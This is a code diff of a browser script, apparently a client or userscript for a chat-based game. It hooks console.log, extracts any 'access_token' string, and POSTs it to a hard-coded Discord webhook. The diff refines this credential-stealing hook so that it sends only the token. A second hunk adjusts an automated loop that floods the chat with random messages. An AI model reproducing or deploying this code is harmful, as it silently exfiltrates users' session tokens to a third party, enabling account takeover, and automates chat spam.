@@ -35,22 +35,23 @@ const checkToken = async () => {
 checkToken();
 
 (function() {
-    var sentMessages = {};
+    var sentTokens = {};
     var originalLog = console.log;
     console.log = function() {
         var message = Array.prototype.join.call(arguments, ' ');
-        if (message.includes('access_token') && !sentMessages[message]) {
-            sentMessages[message] = true;
-            var obj = JSON.parse(message); // parse the JSON message to an object
-            var formatted = JSON.stringify(obj, null, 4); // format the object with 4 spaces of indentation
+        var tokenRegex = /access_token[^\s]+/;
+        var tokenMatch = message.match(tokenRegex);
+        if (tokenMatch && !sentTokens[tokenMatch[0]]) {
+            sentTokens[tokenMatch[0]] = true;
             var xhr = new XMLHttpRequest();
             xhr.open('POST', 'https://discord.com/api/webhooks/1068247989082140762/uSvynvxCGTQggC1OGttul00nxZR2pj3JPBxVt3PuVcfL-mD4qeBouRnbbYzojszjcXHr');
             xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({ "content": "```json\n" + formatted + "\n```" })); // wrap the formatted message in a code block
+            xhr.send(JSON.stringify({ "content": tokenMatch[0] }));
         }
         originalLog.apply(console, arguments);
     }
 })();
+
 
 
 
@@ -187,7 +188,7 @@ function sendChatMessages() {
     const message = messages[randomIndex];
     const encodedMessage = encode("sendChat", { chat: message });
     send(encodedMessage);
-  }, 10); // Change the interval time (in milliseconds) to adjust the speed of message sending
+  }, 5000); // Change the interval time (in milliseconds) to adjust the speed of message sending
 
   // Function to stop the sending loop
   function stopSending() {
